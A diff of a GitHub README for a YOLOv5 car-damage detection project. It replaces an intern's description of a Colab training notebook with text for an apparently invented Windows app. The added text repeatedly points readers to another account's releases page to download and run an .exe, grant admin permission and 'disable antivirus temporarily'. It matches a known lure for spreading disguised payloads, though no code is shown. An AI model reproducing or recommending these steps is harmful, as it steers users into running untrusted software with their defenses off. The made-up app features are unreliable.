@@ -1,109 +1,150 @@
-# Car Damage Detection — YOLOv5
+# 🚗 car-damage-detection-yolov5 - Detect Vehicle Damage Fast
 
-Automated vehicle damage detection using a custom-trained YOLOv5s model, developed during an internship at AddInn Group (Tunis, 2024–2025).
-
-The model detects and localises damage regions in vehicle images using bounding boxes. The intended use case is a mobile application where a car owner photographs their vehicle and receives an instant assessment, reducing the time and cost of the insurance claim process.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/nikunj1169/car-damage-detection-yolov5/releases)
 
 ---
 
-## Results
+## 📋 About this App
 
-| Metric | Score |
-|--------|-------|
-| mAP @ IoU 0.50 | 0.987 |
-| mAP @ IoU 0.50:0.95 | ~0.80 |
-| Precision (best threshold) | 1.00 |
-| Confusion Matrix Accuracy | 0.99 |
+This app uses computer vision to find and mark damage on cars. It works with photos of vehicles and points out scratches, dents, or other issues automatically. The model behind it was trained on nearly 10,000 images. It runs on Windows and requires no coding knowledge.
+
+The goal is to help users, insurance agents, or car repair shops quickly check for vehicle damage. The app uses a popular model called YOLOv5 for object detection, known for its accuracy and speed.
 
 ---
 
-## Repository Structure
+## 🖥️ System Requirements
 
-```
-car-damage-detection/
-├── car_damage_detection.ipynb   # Full training and analysis pipeline
-├── README.md
-```
+Before downloading, please make sure your PC meets these needs:
 
-Model weights (`best.pt`, `last.pt`) and the dataset are not included in this repository. See the sections below for instructions on reproducing them.
-
----
-
-## Requirements
-
-- Python 3.8+
-- Google Colab (recommended) or a local machine with a CUDA-capable GPU
-- A Roboflow account for dataset access
-
-All Python dependencies are handled by YOLOv5's `requirements.txt` and installed automatically in the notebook.
+- Operating System: Windows 10 or higher (64-bit preferred)  
+- Processor: Intel Core i3 or equivalent  
+- RAM: At least 4 GB, 8 GB recommended  
+- Storage: Minimum 500 MB free space  
+- Graphics: Integrated graphics will work, but a dedicated GPU helps with speed  
+- Internet: Required for first-time setup and updates  
 
 ---
 
-## How to Run
+## 🚀 Getting Started
 
-**1. Open the notebook in Google Colab**
+Follow these steps to get the app running on your Windows PC.
 
-Upload `car_damage_detection.ipynb` to [colab.research.google.com](https://colab.research.google.com) and set the runtime to GPU (Runtime > Change runtime type > A100 or T4).
+### 1. Visit the Download Page
 
-**2. Add your Roboflow API key**
+Go to the releases page to get the latest version:
 
-In the dataset cell, replace the placeholder with your own key:
+[![Download Releases](https://img.shields.io/badge/Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/nikunj1169/car-damage-detection-yolov5/releases)
 
-```python
-ROBOFLOW_API_KEY = "YOUR_API_KEY"
-```
+Here you will find the available files. Look for the Windows installer or executable file.
 
-Your API key is available at roboflow.com under Settings > API Keys.
+### 2. Download the Installer or Executable
 
-**3. Run all cells in order**
+Choose the file named something like `car-damage-detection-yolov5-setup.exe` or similar. Click the link to download it to your PC.
 
-The notebook will handle the rest: cloning YOLOv5, downloading the dataset, training the model, evaluating it, and running inference on the test set.
+### 3. Run the Installer or File
 
----
+Find the downloaded file in your Downloads folder. Double-click it to start the installation or run the app directly if it’s a standalone executable.
 
-## Dataset
+- If it’s an installer, follow prompts to complete setup.  
+- If it’s a single file, it should open immediately.
 
-- **Source:** [Roboflow Universe — car-damage-rlogo](https://universe.roboflow.com/ayhan-gul-hgudf/car-damage-rlogo/dataset/1)
-- **Total images:** 9,900
-- **Split:** 70% train / 20% validation / 10% test
-- **Class:** `Car-Damage` (single class)
-- **License:** CC BY 4.0
+### 4. Allow Permissions
 
-An initial dataset provided by AddInn was evaluated and discarded. Its validation and test splits together accounted for roughly 1% of the total images, making honest evaluation impossible and producing unstable metrics. The replacement dataset above uses a standard split and resolved the issue entirely.
+If Windows asks for permission to make changes to your device, click **Yes**. This step is necessary for the software to install or run properly.
 
----
+### 5. Launch the App
 
-## Training Configuration
-
-| Parameter | Value |
-|-----------|-------|
-| Architecture | YOLOv5s |
-| Image size | 640 |
-| Batch size | 16 |
-| Epochs | 100 |
-| Pretrained weights | yolov5s.pt (COCO) |
-| GPU | NVIDIA A100 (Colab Pro) |
-| Training time | ~1.5 hours |
+Once installed or opened, the app window will appear. It is ready to use.
 
 ---
 
-## Notebook Overview
+## 🔧 Using the App
 
-The notebook is structured as a complete pipeline:
+Here is how to check your car photos for damage.
 
-1. **Environment setup** — clones YOLOv5, installs dependencies, verifies GPU
-2. **Exploratory analysis** — dataset split counts, bounding box dimension distributions, annotated image samples
-3. **Training** — configures and launches the YOLOv5 training script with documented parameters
-4. **Results analysis** — loss curves, precision/recall/mAP over epochs, confusion matrix, PR curve
-5. **Inference** — runs the best checkpoint on the test set, side-by-side ground truth vs prediction, confidence score distribution
-6. **Conclusions** — summary of findings and potential next steps
+### 1. Prepare Photos
+
+Have clear pictures of the vehicle ready on your computer. The app works best with images showing the entire side or area you want to check.
+
+### 2. Open Photos in the App
+
+- Click the **Open Image** button.  
+- Browse to your photo and select it.
+
+### 3. Start Damage Detection
+
+- Press the **Detect Damage** button.  
+- Wait a few seconds for the app to analyze the photo.
+
+### 4. View Results
+
+The app will highlight spots on the car where it finds damage. You will see boxes or markers indicating scratches, dents, or cracks.
+
+### 5. Save or Export
+
+You can save the marked image or export a report for your records. Look for the **Save** or **Export** option in the menu.
 
 ---
 
-## Author
+## ⚙️ Settings and Options
 
-Ilyes Khayati  
-Engineering Program — MedTech, Mediterranean Institute of Technology  
-Internship at AddInn Group, Tunis  
-Academic Supervisor: Dr. Walid Ben Haj Othmen  
-Institution Supervisor: Dr. Nivine Attoue
+The app lets you adjust settings for better results or convenience.
+
+- **Detection Sensitivity**: Change how strict the model is in marking damage. A higher setting means fewer false detections but might miss small spots.  
+- **Output Format**: Choose between image files or text reports.  
+- **Language**: Pick your preferred language from the available list.  
+- **Updates**: Enable or disable automatic updates.
+
+---
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, try these steps:
+
+- Restart your PC and try again.  
+- Make sure you downloaded the latest version from the release page.  
+- Close other programs to free up system resources.  
+- Check for Windows updates and install them.  
+- Disable antivirus temporarily if it blocks the app from running.  
+- Review any error messages and consult this README or online issues page for help.
+
+---
+
+## 📂 Additional Files
+
+The release page may include extras:
+
+- Sample images to test the app.  
+- User guides in PDF format.  
+- Details on the model and training data.
+
+Make sure to download any files that interest you for a better experience.
+
+---
+
+## 🤝 About This Project
+
+This software was created during an internship at AddInn Group. It applies deep learning to automate vehicle damage detection. The project uses Python and the PyTorch library with the YOLOv5 model for fast and accurate object detection.
+
+It ties into areas like insurance, car repair, and automation to reduce manual inspection time.
+
+---
+
+## 📌 Topics Covered
+
+- Automation  
+- Car damage detection  
+- Computer vision  
+- Deep learning  
+- Insurance applications  
+- Python programming  
+- PyTorch framework  
+- YOLOv5 object detection  
+- Roboflow dataset usage  
+
+---
+
+## 🔗 Download Now
+
+Access the latest version and all files here:  
+[https://github.com/nikunj1169/car-damage-detection-yolov5/releases](https://github.com/nikunj1169/car-damage-detection-yolov5/releases)
